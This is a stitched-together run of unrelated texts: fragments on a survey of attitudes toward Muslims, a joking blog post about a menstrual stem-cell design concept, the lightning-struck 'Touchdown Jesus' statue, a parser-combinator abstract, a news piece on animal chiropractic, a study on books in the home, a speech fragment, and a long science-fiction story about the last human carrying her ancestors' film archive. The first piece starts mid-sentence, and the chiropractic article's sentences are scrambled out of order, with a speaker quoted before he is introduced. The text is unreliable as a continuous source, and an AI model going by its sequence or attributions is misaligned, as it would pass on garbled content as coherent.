Much of this antipathy , she insisted , stemmed for negative reporting of Islamic issues in the mediaShe asserted that all the negativity exposed by the survey was disheartening because there had been so much hard work done by Muslim - Americans and Muslims worldwide to inform the non-Muslim public about the beauty of Islam .
A far more credible version of the ad has been created here
In February , at a panel about " embarrassing " products and women , someone mentioned that menstrual blood is rich with stem cells .
Comedian Sarah Haskins quipped , " one day we 'll all be living on period farms . "
Good news :
That day is almost here .
Advertisement
According to Fast Company , Chelsea Briganti , a senior at Parsons The New School for Design has created " Mademoicell , " a device that collects menstrual blood for adult stem cells .
" The stem cells found in menstrual blood possess embyronic stem cell markers , " Briganti says .
" These are more potent than bone marrow . "
And as soon as the government figures out how to harness this magical elixir , we 'll all be hooked up to vacuum - sucking tubes , like cows .
Just like filing taxes , ladies will be required to give the feds their period harvests !
We 'll all live on menstrual farms , crammed in period pens while being force - fed chocolates !

Well , not yet .
Right now the Mademoicell is a conceptual product meant to highlight an issue .
But give your census taker the side - eye anyway .
Just for fun .

Touchdown Jesus — the 6 - story King of Kings statue emerging from the lake in front of Solid Rock Church on I - 75 between Cincinnati and Dayton , Ohio — went from this :
to this :
when a bolt of lightning struck the monument .
Apparently , Jesus was n’t made of solid rock but rather styrofoam and fiberglass with a steel frame — a fire waiting to happen .
The irony of an enormous Jesus statue struck down by lightning has kept Southwestern Ohioans busy with witty one liners about the monument resurrecting in three days and worshipping false idols .
But , if God takes requests and happens to read this blog , I would appreciate it if he could take out these billboards on I - 71 next time it storms :
Oh , and this abomination needs to go as well :
Pretty please ?

Abstract A monadic parser combinator library which guarantees termination of parsing , while still allowing many forms of left recursion , is described .
The library 's interface is similar to those of many other parser combinator libraries , with two important differences : one is that the interface clearly specifies which parts of the constructed parsers may be infinite , and which parts have to be finite , using dependent types and a combination of induction and coinduction ; and the other is that the parser type is unusually informative .
The library comes with a formal semantics , using which it is proved that the parser combinators are as expressive as possible .
The implementation is supported by a machine - checked correctness proof .

Animal chiropractic care focuses on biomechanical disorders of the musculoskeletal system , principally the spine .
Treatment typically involves manual manipulation of the joints and soft tissue , measures designed to promote the body ’s natural healing powers .
“ We ’re getting more calls about this from animal owners , and from veterinarians as well , but there ’s not much hard data available , ’’ Smith said .
The official position of the group , a nonprofit association representing 80,000 veterinarians nationwide , he added , is , “ if an animal can benefit from it , the veterinarian has the right to offer that treatment option .
But in all cases a veterinarian should be part of any diagnosis and treatment plan . ’’
Nevertheless , Dr. Craig Smith , a veterinary association staff consultant , said there is strong anecdotal evidence that nontraditional treatments , and specifically chiropractic care , are gaining in acceptance among pet owners and vets alike — even though the association would like to see more rigorous study to determine whether they are indeed both safe and effective .
Regarding it and other so - called alternative therapies such as acupuncture and homeopathy , American Veterinary Medical Association guidelines reflect this division of opinion .
While its membership is “ open to their consideration ’ ’ in prescribing such treatments , the guidelines say , veterinarians “ should exercise caution ’ ’ in pursuing treatment options that may claim to be safe and effective but have yet to be proven so by scientific method .
Animal chiropractic does not lack for skeptics .
As is the case with human patients , chiropractic care is frequently viewed by the medical establishment as unscientifically proven , if not outright quackery .
“ Most horses , like dogs , will let me do whatever I need to do to help them , ’’ Cooper said as he worked .
“ They ’ll see me coming and go , ‘ Oh , I ’m going to loosen up and feel better . ’ ’’
A growing number of horses and dogs — along with cats , goats , birds , zoo animals , and other creatures great and small — are seeing chiropractors as part of a comprehensive treatment plan , one that might otherwise rely upon expensive surgery and potent medication to relieve chronic discomfort , according to veterinarians and animal chiropractic specialists .
Six months ago , according to Jude ’s owner , Abby Clutz , the horse would pin back his ears and “ explode with discomfort ’’ when ridden .
Now , with monthly chiropractic treatments , he is being ridden in equestrian competitions and is off pain medication .
Jude has chronic shoulder tightness and back pain , but he barely flinched as Cooper worked his way along the musculoskeletal system , ending with an “ adjustment ’ ’ thrust to Jude ’s right carpal joint .
WESTON — Both hands planted firmly on Jude ’s hindquarters , Matthew Cooper applied pressure to the horse ’s pelvic region , a chiropractic technique known as motion palpation .
Jude , a 1,200 - pound retired racehorse bearing the legendary Seabiscuit ’s bloodline , is fully capable of kicking Cooper into a barn wall , but stood motionless .
Ten years ago , alternative or “ complementary ’ ’ therapies were rarely mentioned in veterinary schools , said Dr. Alicia Karas , an anesthesiologist with Tufts University ’s Cummings School of Veterinary Medicine .
That has changed dramatically , Karas said , with many schools now offering courses in nontraditional therapies and humans looking at their own health more holistically , then applying that perspective to their pets .
Karas herself is studying acupuncture .
Tufts does not include such courses in its core curriculum , said associate dean for academic affairs Dr. Angeline Warner .
But the school does make training available through elective courses , continuing education programs , and outside speakers in what amounts to “ a slow but steady increase ’’ in studying alternative treatment modalities at Tufts .
The Association of American Veterinary Colleges , an organization representing 28 veterinary teaching institutions , does not track the number of courses or faculty members offering training in chiropractic care , said associate executive director Dr. Ted Mashima .
But , he said , “ our general sense is that these course offerings are on the increase . ’’
Ten animal chiropractic specialists — certified by the 750 - member American Veterinary Chiropractic Association — practice in Massachusetts .
Another five or six are licensed by the organization but are not dues - paying members , according to Dr. Randy Caviness , a Bolton veterinarian who is certified in chiropractic care .
Cooper , based in Wayland , sees human patients four days a week , house pets and horses two days .
Like many others in his hybrid profession , Cooper worked on humans for years before branching out to other species , in his case four years ago .
The convergence of the two professions , veterinary care and chiropractic , is not new ; it began about a century ago before undergoing a revival in the 1980s , according to Cooper and others .
Lately , however , it ’s become less of a curiosity — your border collie gets what kind of treatment ? — and more a commonplace treatment option .
In many cases , practitioners say , an owner might be advised to have an aging pet or farm animal euthanized .
Chiropractic care thus becomes his or her last resort .
“ There ’s this stigma of the little fluff ball some woman brings to her own chiropractor , ’’ Cooper said .
“ But when you think about what we do , people really get it . ’’
By alleviating joint and muscle problems that impede movement , he said , not only can he improve an animal ’s quality of life , he may prolong life , too .
“ For animals , freedom of movement is everything , ’’ he said .
Dr. Gene Giggleman , president of the chiropractic association , said it is no surprise that the appetite for alternative health care has spilled over to veterinary medicine , whether the patients are race horses and show dogs or beloved house pets with arthritis issues .
RENO , Nev. -
Whether rich or poor , residents of the United States or China , illiterate or college graduates , parents who have books in the home increase the level of education their children will attain , according to a 20 - year study led by Mariah Evans , University of Nevada , Reno associate professor of sociology and resource economics .
For years , educators have thought the strongest predictor of attaining high levels of education was having parents who were highly educated .
But , strikingly , this massive study showed that the difference between being raised in a bookless home compared to being raised in a home with a 500 - book library has as great an effect on the level of education a child will attain as having parents who are barely literate ( 3 years of education ) compared to having parents who have a university education ( 15 or 16 years of education ) .
Both factors , having a 500 - book library or having university - educated parents , propel a child 3.2 years further in education , on average .
Being a sociologist , Evans was particularly interested to find that children of lesser - educated parents benefit the most from having books in the home .
She has been looking for ways to help Nevada 's rural communities , in terms of economic development and education .
" What kinds of investments should we be making to help these kids get ahead ? " she asked .
" The results of this study indicate that getting some books into their homes is an inexpensive way that we can help these children succeed . "
Evans said , " Even a little bit goes a long way , " in terms of the number of books in a home .
Having as few as 20 books in the home still has a significant impact on propelling a child to a higher level of education , and the more books you add , the greater the benefit .
" You get a lot of ' bang for your book ' , " she said .
" It 's quite a good return - on - investment in a time of scarce resources . "
In some countries , such as China , having 500 or more books in the home propels children 6.6 years further in their education .
In the United States , the effect is less , 2.4 years , than the 3.2 - year average advantage experienced across all 27 countries in the study .
But , Evans points out that 2.4 years is still a significant advantage in terms of educational attainment .
For example , according to the U.S. Census Bureau 's American Community Survey , Americans who have some college or an associate 's degree , but not a bachelor 's degree , earn an average of $ 7,213 more annually than those with just a high school education .
Those who attain a bachelor 's degree earn $ 21,185 more each year , on average , than those with just high school diplomas .
The study by Evans and her colleagues at Nevada , UCLA and Australian National University is one of the largest and most comprehensive studies ever conducted on what influences the level of education a child will attain .
The researchers were struck by the strong effect having books in the home had on children 's educational attainment even above and beyond such factors as education level of the parents , the country 's GDP , the father 's occupation or the political system of the country .
Having books in the home is twice as important as the father 's education level , and more important than whether a child was reared in China or the United States .
Surprisingly , the difference in educational attainment for children born in the United States and children born in China was just 2 years , less than two - thirds the effect that having 500 or more books in the home had on children ( 3.2 years ) .

Thank you .
Thank you to those of you who have worked to keep our state running while the legislature twiddles its thumbs waiting for election season .
Thank you to school administrators , like Guy Cahill , who did his very best to ensure that Galesburg could keep as many faculty and staff as possible .
Thank you to the little guys who have been stomped on , like many of the non-profits still waiting on funds , but are still kicking .

On a wrist - mounted computer , Betsy Haadama watched a six thousand - year - old silent film .
It was grayscale , overexposed , two - dimensional , and chronologically jumbled .
On the film : a mustachioed man doting over his young son at a crowded zoo .
A woman vigorously combing the boy's white hair beside a large piano .
A family eating a large meal , candles burning on a table , men wearing yarmulkes , bodies shivering in prayer .
A river , people swimming , women in white bathing caps and full - body suits .
Men on rocks by the shore , pipes in mouths , smoke drifting lazily upward .
A park , the boy looking down at a dead pigeon .
Staring .
Staring .
Father picking him up , kissing him .
In the sky , a bright sun .
A young sun .
" Pardon my intrusion in this time of ends , " a Twirlover said , startling her .
The Twirlover 's six separate , hovering pink objects — like human knuckles — danced a looping , synchronized pattern in the air .
" If it pleases you , will you share with me why you watch that flickering device so incessantly ? "
In some parts of the galaxy one could be killed for being human .
Betsy was n't sure if this Eluder Ship was such a place .
But death was coming for all soon enough .
So why fear it now ?
" This is an ancient film of my paternal ancestor , " she said defiantly .
Puffs of air beat against her face as the Twirlover spun .
" An ancient film ?
Indeed , such a rare treasure , an artifact of the past !
If it pleases you , may we watch a portion together ? "
She was about to tell it no , that she 'd rather die alone , contemplating what might have been , when the alarm trilled down the cavernous halls of the Eluder Ship .
A cold shiver ran down her spine as a cacophony of voices warned in ninety languages simultaneously , " Gravitational collapse imminent , my beloveds !
Please take your positions inside your transitional shells ! "
Angry rainbows flared across the floor and ozone and ammonia soured the air , warning those who communicated by color or smell .
Betsy 's mind skipped and stuttered like the ancient film playing on her wrist as a warning to the telepaths skirted the fringes of her consciousness .
Still more warnings she could not perceive with her natural senses no doubt flooded the chamber now .
Hundreds of creatures ran or flew or poured inside their transitional shells , strange cocoons fitted to their variform bodies .
The Twirlover tumbled away as Betsy closed the cover of her shell .
She hugged her knees and shivered as the glass cover sealed her inside with a hiss and a confirmation beep .
A lifeboat or a coffin ?
She 'd find out soon enough .
Transitional shells filled the gargantuan chamber of the Eluder Ship like arrays of soldiers preparing for battle , their noses pointed toward the red - giant star looming outside .
Maera —
" The Daughter Star " — one of the few still - burning stars in the galaxy .
It seethed before all , a conflagration as large as a solar system , turning everything the color of blood .
Forty seconds .
This was a pitiful end , but it was this or slow starvation , privation , death .
The galaxy had been laid sere .
No planets to grow food .
No stars to keep warm .
It was n't fair .
None of them deserved this .
But then she remembered Julio , and what she had done to him at Afsasat .
I left you to die , Julio .
And for that I deserve this .
Thirty seconds .
Soon now , Maera 's heart would cool by a fraction of a degree , and billions of tons of matter , no longer kept aloft by nuclear winds , would plunge towards its gravitational center at the speed of light .
The star would collapse , go nova , and in its tortured heart the universe would tear .
A singularity would form , a black hole , and Betsy Haadama and the thousands of others on this Eluder Ship would ride that collapsing wave into another universe .
Their matter and energy , transmuted into pure information , would seed a new creation , the World to Come .
Their consciousness , over long eons , would push matter into form , coerce dust to life .
In some strange new way they would live on , gods reborn further down the corridor of infinity .
And they had been doing this forever , would be doing this again and again until the end of time .
Or so the litany went .
The story soothed troubled minds .
But the science behind the technology was just a theory .
It could be proven only by first - person observation .
Any object which crossed a black hole 's event horizon could never communicate with the universe again .
Just as easily , she might be annihilated forever .
To those witnessing from the outside , there would be no difference .
Twenty seconds .
She tried not to peer up at The Daughter , though its ember light corrupted everything with its hellish glow .
Instead she watched the film on her wrist : men in fedoras , women in ostentatious hats at an airport , people descending a stairwell from plane to tarmac .
A baby hoisted in the air .
Smiles .
Laughing .
Cut to a park .
The boy looking down at the dead pigeon , staring .
Staring .
Father picking him up , patting him on the shoulder .
The boy , crying .
Why do you stare at the bird ?
Betsy thought .
What are you thinking ?
She looked up at the seething star .
So beautiful , terrible , immense .
A wonder that such a thing existed .
A horn bellowed and Betsy screamed .
" False Alarm !
Beloveds , the imminent collapse was a false alarm !
Spurious readings caused us to make an erroneous conclusion .
We estimate at least six hours before stellar collapse , based on present readings . "
The voice announced the message in multiple languages , simulcast with aggressive rainbows , smells , alien sensations .
I 'm alive !
she thought .
I 'm still here !
It felt exhilarating , for a moment .
Then she remembered she 'd have to do this again .
Slowly , shells opened and creatures emerged .
Betsy scanned the motley lot of them as her cover retracted .
A zoo of sentient species escaping from their cages , creatures made of every color , texture , and temperament .
So much life , she thought .
Snuffed out by the Horde .
Crimes beyond forgiveness .
And made all the more vile because the Horde had been the progeny of the human race .
Betsy activated inositol in her bloodstream via thought command in order to suppress her panic / flight response .
It soothed her , but only just enough to notice the hairs on the back of her neck rising from an electrostatic charge as the Twirlover returned .
" That was exciting ! " it said .
" I would n't call it that , " Betsy said .
" To be so close to annihilation and then to come back again .
It renews the sense of life ! "
" Or the dread of living . "
" But the dread , if you explore it , " the Twirlover said , " reveals the miracle of existence out of nothingness .
From out of horror comes life . "
The litany again .
" Or out of life , horror , " she said .
It tumbled quietly for a moment .
" Sometimes . "
It moved closer to inspect her film .
" That 's a child of your species , is it not ? "
She glanced down at her screen .
" No , that 's a rhinoceros . "
" Ree -Nos - Ur - Us .
What a marvel of composition , all those rolling mountains of flesh .
Does it still exist ? "
" Extinct . "
The Twirlover whistled a mournful , descending arpeggio .
" Like so much life in the galaxy .
Like the once - glorious stars . "
The Horde had obliterated stars by the billions .
They had wrapped the Milky Way inside a bleak cocoon of transmatter so that nothing , no ship , no signal — not even light — could pass .
And then they vanished , leaving the galaxy to rot .
Such was the legacy of humanity .
She wondered if the Twirlover would kill her outright if it knew what she was .
Death by physical means might be preferable , she thought , to being flash - baked into quantum - entangled gamma rays .
Six in one , really .
The film cut to a boy in a crib , bouncing .
His mother lifting him , smiling for the camera .
The boy laughing .
" That 's one of us , " she said .
" My paternal ancestor . "
Surprising herself , she felt pride .
" Ah , such wonderful protuberances ! "
A wisp of dust coalesced above Betsy 's head .
Winking diamonds swirled in yellow clouds .
An aeroform creature .
For a moment she glimpsed her own face of colored sparkles reflected back at her .
But the aeroform being soon spiraled away , only to pause a few seconds later before a group of fronded Whidus who turned their mushroom - like eyes in her direction .
Maybe they recognized her , knew what she was .
Maybe they were plotting her demise .
A second , identical Twirlover approached Betsy and said to the first , " You know , my bonded - one , that we are about to die , do you not ? "
" I was about to come back to you , my flesh - bond , " the first said .
" And tell you about my sharing with this creature . "
" Indeed you were .
I saw you tumbling towards me with great haste . "
" My flesh - bond , just take a good look at her smooth , auburn skin , the fine black threads that emerge from her head , the little valve at her peak where she modulates her words with a bacteria - laden pink muscle !
And on her upper - left protuberance , that metal device which flicker - flashes with strange images .
She watches it incessantly .
She is curious , is she not ? "
" There is something curious here , certainly . "
" My love , let us join so I can share my thoughts with you . "
" Indeed , I look forward to it ! "
The two tumbled together into a single dancing , twelve - piece ring .
Knuckles hopped , bounced , tumbled over each other .
Music piped and whistled in byzantine harmonies .
There arose a great shriek about them , and soon after they separated again into six - pieced individuals .
Betsy thought they might have interchanged pieces in the process .
" Not fair ! " said the second .
Or was it the first ?
Betsy could n't tell them apart anymore .
" You playful trickster !
You gave me your segment , so now I know your thoughts .
But then , you sense my emotions too . "
" What joy it is to share mind with you , beloved !
Yes , I feel your misplaced jealousy .
And so much of it !
What a waste of energy .
Do n't you see ?
This creature is alone and needs to share with someone ! "
" Perhaps , but does it have to be you ? "
" Not me alone , but us together ! "
" In this last hour , you would defile us ? "
" Please ! " Betsy interjected .
" I 'd prefer to be alone anyway — "
" One must never be alone ! " the first said .
" Share with us !
Let us merge gloriously with your words . "
" Indeed , tell us , " the second said , " Did you have a bonded - one who abandoned you , who wandered off to have intercourse with strangers when you need him ? "
' Intercourse ? ' she thought .
Perhaps there was more to the Twirlover concept of sharing than she realized .
" Actually , I left him . "
" Of course you did , " the second said .
" Like attracts like . "
" Where did you abandon him ? " the first said .
Interesting , the way it had interpreted her words .
" I left him at the first nova , " she said .
" The Mother Star . Afsasat . "
" You were at Afsasat and you did n't go through the event - horizon ? " the second said .
" I do n't believe your story !
Beloved , look how she defiles this union ! "
" Surely , " the first said , " you are joking , trying to please us with paradox ?
Why would you do something so idiotic ?
Why not escape through Afsasat when you had the chance ? "
She sighed and turned her attention to the film on her wrist .
Mustachioed father and blond - haired son walking down a path .
Father , smiling .
Boy running , falling .
Crying .
Father picking him up , kissing him .
All better .
All better .
" Did you hear our questions ? " the first asked .
" Yes , " she said .
" It 's just that it 's a very long story . "
" Our lives are stories .
We are empty without them .
Fill us so we may fill you . "
Strangely , she had stopped shivering .
She even felt a little warm .
If this was intercourse , then she was determined to be a good lover .
" This film is part of ' The Biography , ' " she said .
" A record of my ancestors ' lives that was encoded within my genes . "
" Such joy !
I have heard of this technology , the sharing of such immensity , " the first said .
" How far back do your records go ? "
" About six thousand years . "
The second squealed .
" I told you , beloved , " the first said .
" She is share - worthy . "
Her mother had told her the story in the quiet hours while drifting under the ash streams of the decimated Magellanic Clouds , or over stale , thrice - brewed tea , while the ice - blue rings of Cegmar rose above the horizon , or while her mother gently brushed her hair and chills trickled down her spine .
When he turned seventy , the boy in the film digitized his aging childhood reels and then gave them to his son .
His son added films , photos , and memorabilia and passed the collection to his offspring .
His children added more history and passed this collection on again .
This continued for generations .
Eventually his descendants decided to encode this amalgamated history within their DNA , so it would never be lost or forgotten .
Every child was thereafter born with the memories of their parents , and theirs before them , and theirs before them .
And also in their bodily archives were the early records — the films , photos and keepsakes that started the tradition .
The Biography was an ancient and unbroken chain that began with this black and white film playing on her wrist .
The first .
And now the last .
" It 's so large ! " the second said .
" Excuse me ? " she said .
" Your story , " the first said , " To carry all that history within you ! "
" It 's not in me anymore .
Julio and I stripped all of it , every last base - pair , from our genes .
I recall only my personal experiences now .
This computer ... it holds the last copy .
This is the Biography , now . "
This fragile , solitary thing on her wrist .
" But why ? "
Moans and tweets .
" That must have been an immense loss ! "
The answer was complex , full of shame and guilt .
Instead she offered the highly edited version .
" Because we wanted to enter the World to Come without a past . "
The Twirlovers tumbled noisily , screeching .
" I put the Biography on this ancient computer , " she said , pointing to her wrist .
" It belonged to my grandmother , five hundred and eighty years ago .
Julio and I parked our starsloop in orbit around Afsasat and we stowed this wrist - player in our shrine - room .
We said goodbye to our past and then we flew over to the Eluder Ship .
Our starsloop and the Biography within would be destroyed when Afsasat went nova . "
Chirps .
Squeals .
" But Afsasat took its time .
So I explored every corner of the Eluder Ship .
I discovered that none of my species were there .
That meant Julio and I might be the last of my kind in existence .
And that meant the Biography was the last of its kind too . "
A duet of whistles in a major key .
" I used to recall the smell of my great - grandmother 's hair of twenty - three generations ago as her lover leaned in to kiss her pink lips .
I knew every defect in the bathroom tiles of the beach house where my ancestor Rhindi lived four thousand years ago .
I could hear the gulls cry as they flew in the colored dawn as the four suns rose , one green , one orange , one yellow , and one blue before Eleanor left her family for war , to die in deep space , but not before she had a son to pass on the memory .
I once remembered the joy Yalta felt toward his seventeen lanky daughters , all born in zero-g , all tall , graceful , beautiful , with eyes like blue giants .
These were n't others ' lives .
They were mine .
I had lived these lives too . "
Seven long , high notes .
" So many people had once lived inside of me .
Even these memories that I 'm telling you about now — they come from this device !
Not from me !
I 'm silent inside .
And I realized that if I let the Biography die I would be murdering billions .
Just like the Horde . "
A very human gasp , then a precipitous pause .
" So I changed my mind .
I decided I 'd bring the Biography with me into the World to Come .
My ancestors deserved that much .
I was about to retrieve it from our starsloop , but Julio held me .
Afsasat could go nova at any moment , he said .
And ... he wanted to sever us from the past .
I disagreed . "
Betsy started shaking again as the moment became clear in her mind .
She remembered his exhausted , pleading eyes , his unruly black beard .
" Did you forget what they did ? " Julio had said .
" Did you erase that memory too ?
The Horde , the progeny of the human race , stole our children !
And you want to bring their history with us ?
We decided we would n't allow that .
The Biography has to be destroyed . "
" I know what we decided , Julio ! " she said .
" But I ca n't let all those people die ! "
" They 're already dead , Betsy ! "
" I can't believe you just said that . "
Her face grew hot .
" They 're not dead !
They once lived within us !
They gave us our lives , and we owe them our memories ! "
" I do n't feel that way at all . "
" Julio , how can you abandon them so easily ? "
" They led us to this place of death and horror .
I sever myself from the past for that reason alone . "
And in the end , it was she who had abandoned him .
She swallowed down her tears as the Twirlovers squealed and beckoned her to continue .
" I told Julio I wanted to wander the ship alone , and instead I snuck off to fetch the Biography .
Maybe he knew where I was going .
I 'll never know .
I reached my starsloop and was ready to return when I heard the alarm .
Afsasat was collapsing .
One minute to nova .
Not enough time to return safely .
I panicked .
I had to save the Biography , all those lives , from destruction .
Nothing else mattered .
I powered up my ship and fled . "
For weeks she had wondered , did Julio search the Eluder Ship for her ?
What did he feel when he realized she had left him ?
Like the thoughts of the boy in the film , she 'd never know .
He had entered a black hole , and nothing could cross that dark horizon .
The Twirlovers cried out , a piercing shriek .
Perhaps they orgasmed together .
Eventually , the second said , " What a dirty tale !
So much abandonment .
I feel defiled .
A sinner !
This is the kind of sharing you wanted , my beloved ? "
" But in fetching her Biography she returned to her people ! " the first said .
" Do n't you see ?
Is n't sharing so much more rewarding after a long absence ? "
" You twist words easily , my bonded - one !
Her story was ... acceptable . "
A large Perslop sloshed towards them .
The creature was amber , a gelatinous three - limbed starfish with translucent skin and dozens of eyes like upturned brown bowls .
" Do you wish a comforting invocation ? " the Perslop said .
A slit tucked into one of its armpits burped open to reveal hundreds of tiny white teeth , and its warm breath reeked of dead seas .
" I know rituals from a thousand faiths .
Or , if you wish , you may teach me one . "
Its voice was like wind blowing over ruins .
" Blessings , smooth - skinned pleasure to behold ! " the first Twirlover said .
" We welcome a fourth to share ! "
" No we do not ! " the second Twirlover said .
" My flesh - love , please ! " the first said .
" Do not be rude . "
Then to the Perslop : " Instead of an invocation , my finely contoured friend .
Will you share a story with us ? "
" Incorrigible ! " the second said , tumbling furiously .
With the moist end of one if its arms , the Perslop inched towards Betsy 's wrist .
The tip opened into a tripod of three small fingers , with diminutive brown eyes capping the end of each .
The eyes wiggled nervously above the ancient film .
" What is this ? " it asked .
" It 's her people 's history ! " the first said .
" From six - thousand years ago ! "
" Interesting , " the Perslop said .
" Your race has n't changed much . "
" That 's a duck , " Betsy said .
" Extinct . "
" So , that 's you there ? "
" No , that 's a walrus .
Also extinct . "
" Then whose history did you say we are watching ? "
" My race .
They 're at a zoo . "
" A 'zoo ? ' " the Perslop said .
" A place that housed animals in cages . "
" What for ? "
" So they could observe them without danger to themselves , " she said .
" Another act of separation ! " the second Twirlover said .
" Such a barbaric , dirty race ! "
" Her filth notwithstanding , keeping something caged is not barbarism , " the Perslop said , its moist arm dangling an hairsbreadth from Betsy 's face .
" Before the Horde destroyed my brothers , I used to travel with my colony to a fecal press , where we severed one of our limbs and tortured it in a cage until it released a small amount of feces .
We then burned that feces as an offering to the Absent One .
They were profoundly holy events .
And I miss them very , very much . "
The second Twirlover squeaked loudly three times .
" You see , my beloved ? " the first said .
" This is the joy you have missed by withdrawing from union all these years ! "
On Betsy 's wrist the film played on , men in white shorts and shirts playing handball .
Women sitting on the sidelines bringing smoky cigarettes to their lips .
The young boy , a few years older , standing on a porch , talking to a beautiful girl .
" You simplify my thoughts ! " the second Twirlover said .
" I take no joy in the suffering of others .
If I did , I would find pleasure in the atrocities of the Horde .
But those are stories I never wish to hear again .
If I could , I would erase them from history like this creature erased this Biography from her genes ! "
If only that were possible , Betsy thought .
To rewrite history .
If so , she'd go even further back , to the creation of the Horde , more than three hundred years ago .
Humanity had been evolving rapidly for generations .
They had augmented their consciousness to the point that the body became irrelevant .
Flesh was now a temporary abode , while the mind was free to explore and play in infinite space .
Epic works of art , science , and philosophy were commonplace .
Physical suffering had been eradicated .
It was a true Golden Age of humankind .
But the Hagzhi , a prideful , stoic and gargantuan species that had once peacefully abided humans , became fearful of humanity 's growing power over matter and began to spread lies and sow seeds of mistrust .
Later , the Hagzhi began to systematically exterminate humans as a way to prop up their own faltering galactic hegemonies .
Humanity was nearly destroyed in the wars that followed , but after that tumult , humans vowed that they would never let such a catastrophe happen again .
Through heroic feats of research they discovered the secret folds of negative time and learned the simple mystery behind the origins of consciousness .
They learned how to , with a thought , create a sun .
And with another , destroy it .
The Hagzhi race vanished from existence in a day .
One hundred and seventy planets , moons , outposts and stations erased from the universe .
Later , for no reason anyone could discern , other races vanished .
Races which had never threatened humanity .
The Onyx Horde , as this force came to be known , acted without cause or reason .
Not all humans accepted the rise to supra-consciousness .
Not all humans wanted to change .
The Horde slaughtered those who resisted .
Those who hid were found , tortured , and killed .
And there were those , like Betsy 's ancestors , who had made a deal and were spared .
" Keep the Biography in your genes , " the Horde had commanded her ancestors .
" Keep your physical human form .
Do this and you will not die . "
And her ancestors agreed , and survived , even prospered , while the rest of the galaxy was ruined .
When the other races discovered that there were humans who were spared the Horde 's madness , that the Horde were the progeny of the human race , the long dormant seeds of doubt that the Hagzhi had planted re-sprouted , this time across the entire galaxy .
Humans were slaughtered without remorse , and the Horde did not come to save them .
If I were given that choice now , Betsy thought .
To live or die by their rules , I would have chosen death .
I 'd rather die than live under their darkness another instant .
On the film , a crowded beach .
People swimming .
Large umbrellas casting shadows .
Wisps of cloud in the sky , all under a bright sun .
A young sun .
The Twirlovers stopped twirling .
The Perslop leaned in closer to see .
" Such a young sun , " the Perslop said .
" Bright and warm .
The sight fills me with sadness .
No longer do such stars burn in the Milky Way .
Here we orbit this dying star in a dead galaxy where only a few cinders burn in a quiescent sea .
And all about the universe a hundred billion galaxies dangle forever beyond our reach .
The Onyx Horde has sealed us forever from their glorious light .
May their souls be stripped from eternity ! "
On the film , a party .
People laughing , dancing , hands on hips , forming a human train .
Cone - shaped hats .
" What are they doing ? " the Perslop asked .
" A party , " Betsy said .
" A new year 's celebration . "
" And why do they bounce up and down ? "
" They 're dancing . "
" Do you remember , my soul - union , " the first Twirlover said , " how we danced for three ascensions of the Hagic Moon with the birth of our tumble - litter ? "
" I shall never forget ! " the second said , squealing .
" Our many tumblers , searching for their bond - sisters .
How they merged and separated a thousand times before they joined the sisters to complete their soul ! "
" May they find the path to the Glory Star that resides at the center of creation . "
On the film , the blond boy in the corner staring into the camera eye .
I 'd always assumed that one day someone would look into the Biography and see me .
But I 'm the last , are n't I ?
" Your children , are they dead ? " the Perslop said to the Twirlovers .
" They were living on Ental , " the second said .
" It was obliterated by the Horde . "
A hiss like a distant wave crashing on an empty beach .
" I had nine offspring , " the Perslop said .
" Three died in the disastrous attempt to pass through the galaxy 's transmatter shell .
Three died of malnutrition .
Two died in an experiment to create a new star . "
" That 's only eight , " the first Twirlover said .
" And the ninth ? "
" Suicide . "
On the film , an elderly couple in formal clothing sitting beside a bright window .
Their bodies in silhouette .
The woman , Bessie .
The man , Oser .
Betsy 's oldest ancestors in the Biography .
She and Julio had named their children after them .
A boy and girl .
Twins .
She remembered their puffy , newborn faces , their eyes hungry for life .
She and Julio and her children had been living on the temperate moon of Aeoschloch with one hundred other Biography - carrying humans , far from the wars and the suspicions of the other races .
And one morning , as the swirling black eye of the gas giant
Ur rose above the distant hills , as she was breast - feeding her twin children , she was swept away .
She could not see or hear or sense anything , even her own screams , but she felt a presence probing her , scanning her , reading and rereading the Biography within her as if it were the most important thing in the universe .
And she knew this presence , remembered it from the Biography and the memories within .
The Onyx Horde .
Then the Horde spit her and a hundred other humans out over the sandy coastline .
Some people did not rise from the cold beach .
Their eyes stared lifeless into the starless sky .
Some had organs missing or were merged with others into horrible grotesqueries .
Some went mad .
Some had reappeared in the ocean and drowned .
And the children , all the pre-pubescent ones , had vanished .
The Horde had taken them .
Every one .
Oser and Bessie , two months old , barely enough time to open their eyes and learn their parents ' faces .
Gone .
The seventy surviving colonists were wrecked , devastated .
Should they have more children ?
No , they decided , the Horde could just as easily take them again .
Should they try to forget and live out their lives on this backwater moon ?
No , how could they ever find joy again , knowing that the Horde could come again at any time ?
Then the colonists heard about Afsasat , the Eluder Ship being built there and a possible way to escape the Horde forever .
And so it was decided .
The colonists would end their history on their own terms .
They would attempt to enter the World to Come , but without the Biography inside of them .
They would excise it from their genes , shedding themselves from the thing which the Horde seemed so desperately to desire .
Shedding themselves of humanity 's sordid history .
It would be , in their own small way , revenge .
But they 'd have to get to Afsasat first .
The Eluder Ship was being constructed in a quadrant of space that was rumored to be tolerant of humans .
But the colonists would have to navigate through large quadrants of dangerous space .
So they traveled in many ships , by multiple circuitous and zigzagging routes .
Betsy and Julio arrived safely .
When Betsy walked around the ship , looking for other humans , she found none .
They were the last two .
And now , on this second Eluder Ship , there was only her .
Outside the windows , lightning the size of a hundred dead planets forked across Maera 's surface .
The star looked ancient , tired , ready to sleep forever .
The aliens throughout the chamber paused to stare up at the star .
Her wrist flickered like the star outside .
On the film , the mustachioed man .
The woman with the beautiful black hair .
Another party .
A different day .
A cake with five flames .
Eyes reflecting candlelight .
The boy , blowing the flames out .
Smoke and applause .
Silent cheer .
" You said you wanted a story , " the Perslop said , " Well I have one .
A few weeks ago I confronted a group of wandering Ergs .
One told me that he 'd captured a human — "
Betsy started in her seat .
" The Erg said the human was an ugly , repulsive thing , " the Perslop continued .
" With dark hair covering most of its carbuncle head , and liquid leaking from its odious eyes .
It pleaded for its life .
And the Erg , a compassionate being , decided ultimately to let it go .
But afterward he became terribly distraught .
He said he'd missed his opportunity to destroy a creature which had caused so much of the galaxy 's pain .
For a long time I considered this Erg 's position .
" I once had a vast starship .
I found a bore - worm nibbling in my refuse berth .
I believed in the sanctity of all life , and decided to let it live .
Six weeks later , my ship was infested with bore - worms , and no one would dock with me for fear of having their hulls eaten .
I had to incinerate my ship .
You see , I let one worm live , and thousands returned to ruin me .
Is it not the same with humans ?
If we let one live , do we not give them the chance to destroy us again ?
I told the Erg that he did the righteous thing , but I truly did not — do not — believe it myself . "
The Twirlovers chirped quietly .
" Where did he find this human ? " she blurted .
" How many weeks ago was this ? "
Dark hair covering its head ?
